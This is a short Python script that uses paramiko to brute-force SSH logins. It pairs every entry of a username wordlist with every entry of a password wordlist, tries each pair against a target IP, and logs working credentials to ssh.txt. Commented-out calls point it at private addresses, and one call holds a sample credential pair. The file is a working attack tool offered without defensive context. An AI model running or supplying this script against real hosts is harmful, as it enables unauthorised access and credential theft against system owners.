import paramiko

usernamefile = 'username.txt'
passwordfile = 'password.txt'

def ssh_conn(ip,username,password):
    print('start connect %s...' % ip)
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=ip, username=username, password=password,timeout=10)
        print('host %s ssh username=%s password=%s' % (ip,username,password))
        with open('ssh.txt','a') as file:
            file.write('host %s ssh username=%s password=%s\n' % (ip,username,password))
            file.flush()
    except:
        pass

def ssh_crack(ip):
    for username,password in getPasswordDic():
        ssh_conn(ip,username,password)

def getPasswordDic():
    retDic = []
    try:
        with open(usernamefile,'r') as usernameFile:
            for username in usernameFile.readlines():
                with open(passwordfile,'r') as passwordFile:
                    for passwd in passwordFile.readlines():
                        retDic.append((username.strip(),passwd.strip()))
    except:
        print('username file or password file error.pls check.')
        return []
    return retDic

# ssh_conn('172.18.3.8','issor','issorgnnt')
# getPasswordDic()
# ssh_crack('192.168.1.1')